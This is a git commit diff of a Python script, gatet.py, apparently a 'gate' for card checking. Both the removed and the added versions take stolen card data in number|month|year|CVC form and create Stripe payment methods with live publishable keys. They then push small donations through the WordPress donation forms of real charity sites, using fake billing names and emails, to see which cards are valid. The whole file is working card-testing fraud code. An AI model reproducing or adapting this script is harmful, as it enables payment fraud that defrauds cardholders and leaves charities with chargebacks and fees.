b248a7f088b28f13f269d4082ceea04fb07b24b9
Wang Lin <maythusharmusic@gmail.com>
2025-12-22 11:50:38 +0630

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -1,145 +1,80 @@
-import requests
-import re
+import requests,re
 import random
-
 def Tele(ccx):
-    ccx = ccx.strip()
-    n = ccx.split("|")[0]
-    mm = ccx.split("|")[1]
-    yy = ccx.split("|")[2]
-    cvc = ccx.split("|")[3]
-    
-    if "20" in yy:  # Mo3gza
-        yy = yy.split("20")[1]
-    
-    r = requests.session()
-    
-    random_amount1 = random.randint(1, 4)
-    random_amount2 = random.randint(1, 99)
+	ccx=ccx.strip()
+	n = ccx.split("|")[0]
+	mm = ccx.split("|")[1]
+	yy = ccx.split("|")[2]
+	cvc = ccx.split("|")[3]
+	if "20" in yy:#Mo3gza
+		yy = yy.split("20")[1]
+	r = requests.session()
+	
+	random_amount1 = random.randint(1, 4)
+	random_amount2 = random.randint(1, 99)
 
-    headers = {
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Cache-Control': 'max-age=0',
-        'Connection': 'keep-alive',
-        'Sec-Fetch-Dest': 'document',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-Site': 'none',
-        'Sec-Fetch-User': '?1',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-    }
-    
-    response = requests.get('https://remember.org.au/donate/', headers=headers)
-    
-    form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
-    donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
-    
-    headers = {
-        'authority': 'api.stripe.com',
-        'accept': 'application/json',
-        'accept-language': 'en-US,en;q=0.9',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://js.stripe.com',
-        'referer': 'https://js.stripe.com/',
-        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-    }
-    
-    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fbe0b733d77%3B+stripe-js-v3%2Fbe0b733d77%3B+card-element&key=pk_live_51P0v83B09gpyA2Juu5SSq35nUSMyDWVutWv5RAWYv2XeUviqlqhfV5JlBgK64uhOVb0LWcthjR2aJwo5NkNfimZr00g4SiBFrz'
-    
-    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-    
-    pm = response.json()['id']
-    
-    headers = {
-        'Accept': 'application/json, text/javascript, */*; q=0.01',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'Origin': 'https://remember.org.au',
-        'Referer': 'https://remember.org.au/donate/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-        'X-Requested-With': 'XMLHttpRequest',
-        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-    }
-    
-    data = {
-        'charitable_form_id': f'{form_id}',
-        f'{form_id}': '',
-        '_charitable_donation_nonce': f'{donation_nonce}',
-        '_wp_http_referer': '/donate/',
-        'campaign_id': '13890',
-        'description': 'Donate',
-        'ID': '0',
-        'gateway': 'stripe',
-        'donation_amount': 'custom',
-        'custom_donation_amount': '1.00',
-        'title': '',
-        'first_name': 'Dao',
-        'last_name': 'Kera',
-        'email': 'pyaesone20psp@gmail.com',
-        'phone_type': '0',
-        'phone': '2698571246',
-        'address': '',
-        'city': '',
-        'state': '0',
-        'postcode': '',
-        'country': 'AU',
-        'donation_reason': '',
-        'stripe_payment_method': f'{pm}',
-        'action': 'make_donation',
-        'form_action': 'make_donation',
-    }
-    
-    response = requests.post('https://remember.org.au/wp-admin/admin-ajax.php', headers=headers, data=data)
-    
-    try:
-        scrt = response.json().get('secret')
-        if not scrt:
-            return response.text
-        pi = re.search(r"(pi_[^_]+)", scrt)
-        pi = pi.group(1)
-    except Exception:
-        return response.text
-    
-    headers = {
-        'authority': 'api.stripe.com',
-        'accept': 'application/json',
-        'accept-language': 'en-US,en;q=0.9',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://js.stripe.com',
-        'referer': 'https://js.stripe.com/',
-        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-    }
-    
-    data = f'expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51P0v83B09gpyA2Juu5SSq35nUSMyDWVutWv5RAWYv2XeUviqlqhfV5JlBgK64uhOVb0LWcthjR2aJwo5NkNfimZr00g4SiBFrz&client_attribution_metadata[client_session_id]=fc7d8c11-0e32-4aed-8000-ee986d652c67&client_attribution_metadata[merchant_integration_source]=l1&client_secret={scrt}'
-    
-    response = requests.post(
-        f'https://api.stripe.com/v1/payment_intents/{pi}/confirm',
-        headers=headers,
-        data=data,
-    )
-    
-    return response.text
-
-# gate.py
+	headers = {
+	    'authority': 'api.stripe.com',
+	    'accept': 'application/json',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://js.stripe.com',
+	    'referer': 'https://js.stripe.com/',
+	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+	}
+	
+	data = f'type=card&billing_details[name]=Gen+Paypal&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fdda83de495%3B+stripe-js-v3%2Fdda83de495%3B+card-element&key=pk_live_51IHAKHL6qXoZf0q29lYxHyPHZJNFSiu4rIZYLu2SkX2udCs8pRAj2ERKv0Zd19qvd3tdVjK2T5wgAewUdnj31Acp00lDEO8pxL'
+	
+	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	
+	pm = response.json()['id']
+	
+	headers = {
+	    'authority': 'www.miamibeachchamber.com',
+	    'accept': 'application/json, text/javascript, */*; q=0.01',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    'origin': 'https://www.miamibeachchamber.com',
+	    'referer': 'https://www.miamibeachchamber.com/education-foundation/',
+	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+	    'x-requested-with': 'XMLHttpRequest',
+	}
+	
+	data = {
+	    'action': 'wp_full_stripe_inline_donation_charge',
+	    'wpfs-form-name': 'EducationFoundationDonationTeacherGrants',
+	    'wpfs-form-get-parameters': '%7B%7D',
+	    'wpfs-custom-amount': 'other',
+	    'wpfs-custom-amount-unique': '1',
+	    'wpfs-donation-frequency': 'one-time',
+	    'wpfs-custom-input[]': '',
+	    'wpfs-billing-name': 'Gen Paypal',
+	    'wpfs-billing-address-country': 'US',
+	    'wpfs-billing-address-line-1': '27 Allen St',
+	    'wpfs-billing-address-line-2': '',
+	    'wpfs-billing-address-city': 'New York',
+	    'wpfs-billing-address-state': '',
+	    'wpfs-billing-address-state-select': 'NY',
+	    'wpfs-billing-address-zip': '10002',
+	    'wpfs-card-holder-email': 'genpaypal01@gmail.com',
+	    'wpfs-card-holder-name': 'Gen Paypal',
+	    'wpfs-stripe-payment-method-id': f'{pm}',
+	}
+	
+	response = requests.post('https://www.miamibeachchamber.com/wp-admin/admin-ajax.php', headers=headers, data=data)
+	
+	result = response.json()['message']
+	
+	return result
